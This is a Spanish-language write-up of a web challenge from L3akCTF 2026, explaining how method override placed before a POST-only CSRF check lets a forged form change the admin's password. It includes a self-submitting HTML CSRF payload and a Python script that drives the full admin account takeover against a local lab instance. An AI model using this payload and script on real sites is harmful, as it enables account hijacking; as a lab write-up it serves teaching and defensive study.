🏆 Writeup: Get The Flag – L3akCTF 2026

Categoría: Web
Dificultad: Media
Flag: L3AK{Meth0D_oVeRRiDe_CsRF_BYPas5_go_BrRrr}
🔎 1. Reconocimiento

La aplicación permite:

    Registro/Login de usuarios.

    Subida de páginas HTML (/pages/upload).

    Reporte de URLs a un bot administrador (/report).

    Cambio de contraseña (/account/change-password).

    Visualización de la flag (/flag), solo para admin.

El bot (Puppeteer) visita las URLs reportadas autenticado como admin, permaneciendo 5 segundos en la página.
🧩 2. Análisis del código fuente (movimientos clave)
📌 app.js – Middleware methodOverride
javascript

app.use(
  methodOverride((req) => {
    if (typeof req.query._method === "string") {
      return req.query._method.toUpperCase();
    }
  })
);

Observación: Permite sobrescribir el método HTTP usando _method en la query string.
Ejemplo: POST /ruta?_method=GET → se convierte en GET.
📌 app.js – Middleware CSRF
javascript

function csrfOnPostOnly(req, res, next) {
  if (req.method !== "POST") {
    return next();
  }
  if (!req.body.csrf || req.body.csrf !== req.session.csrf) {
    return res.status(403).send("Invalid CSRF token");
  }
  next();
}

Observación: La validación CSRF solo se aplica a peticiones POST. Las GET están exentas.
📌 app.js – Endpoint /account/change-password
javascript

app.all(
  "/account/change-password",
  requireLogin,
  csrfOnPostOnly,
  (req, res) => {
    if (!["GET", "POST"].includes(req.method)) return res.sendStatus(405);
    if (req.method === "GET" && !req.body?.password) {
      return res.render("change-password", { csrf: req.session.csrf });
    }
    const { password, confirm } = req.body;
    if (!password || password !== confirm || password.length < 8) {
      return res.status(400).send("...");
    }
    changePassword(req.session.userId, password);
    res.send("Password changed successfully");
  }
);

Observación: Acepta GET (muestra formulario) y POST (cambia contraseña si CSRF válido).
Fallos de diseño:

    methodOverride se ejecuta antes de csrfOnPostOnly.

    Si enviamos POST con _method=GET, la petición se convierte en GET y csrfOnPostOnly no se ejecuta.

    El controlador procesa el req.body incluso si el método es GET (porque los datos del formulario POST se mantienen).

💥 3. Vulnerabilidad identificada

Bypass de CSRF mediante sobrescritura de método:

    El bot admin visita nuestra página.

    Nuestra página envía un POST a /account/change-password?_method=GET con password y confirm.

    methodOverride convierte la petición a GET.

    csrfOnPostOnly no se ejecuta (solo en POST).

    El controlador recibe password y confirm del body y cambia la contraseña del admin sin token.

⚡ 4. Explotación
📄 Payload HTML

Archivo payload.html:
html

<!DOCTYPE html>
<html>
<body>
    <form method="POST" action="/account/change-password?_method=GET">
        <input type="hidden" name="password" value="hacked123">
        <input type="hidden" name="confirm" value="hacked123">
    </form>
    <script>
        document.forms[0].submit();
    </script>
</body>
</html>

Objetivo: Al ser cargado por el bot, envía el formulario automáticamente y cambia la contraseña del admin a hacked123.
🐍 Script Python de automatización
python

import requests
import time

BASE_URL = 'http://localhost:13337'   # Ajustar si es necesario

s = requests.Session()

# 1. Registrar y loguear como atacante
s.post(f'{BASE_URL}/register', data={
    'username': 'hacker',
    'password': '12345678',
    'confirm': '12345678'
})
s.post(f'{BASE_URL}/login', data={
    'username': 'hacker',
    'password': '12345678'
})

# 2. Subir payload
with open('payload.html', 'r') as f:
    html = f.read()

upload = s.post(
    f'{BASE_URL}/pages/upload',
    data={'html': html},
    headers={'Accept': 'application/json'}
)
page_url = upload.json()['url']
print(f'[+] Payload subido: {page_url}')

# 3. Reportar al bot
s.post(f'{BASE_URL}/report', data={'url': page_url})
print('[+] Reportado. Esperando 8 segundos...')
time.sleep(8)

# 4. Cerrar sesión del atacante y loguear como admin con nueva contraseña
s.get(f'{BASE_URL}/logout')
login = s.post(f'{BASE_URL}/login', data={
    'username': 'admin',
    'password': 'hacked123'
})

if 'dashboard' in login.url:
    print('[+] Login admin exitoso')
    flag = s.get(f'{BASE_URL}/flag')
    print('[+] FLAG:', flag.text)
else:
    print('[-] Falló login')

🏁 5. Resultado

Al ejecutar el script, se obtiene:
text

[+] Payload subido: /pages/550e8400-e29b-41d4-a716-446655440000.html
[+] Reportado. Esperando 8 segundos...
[+] Login admin exitoso
[+] FLAG: L3AK{Meth0D_oVeRRiDe_CsRF_BYPas5_go_BrRrr}

📌 6. Resumen técnico
Componente	Vulnerabilidad
methodOverride	Permite cambiar POST a GET mediante _method.
csrfOnPostOnly	Solo protege POST, no GET.
Orden de middlewares	methodOverride antes de csrfOnPostOnly, permitiendo bypass.
Bot admin	Ejecuta el payload con sesión de admin, aplicando el cambio de contraseña
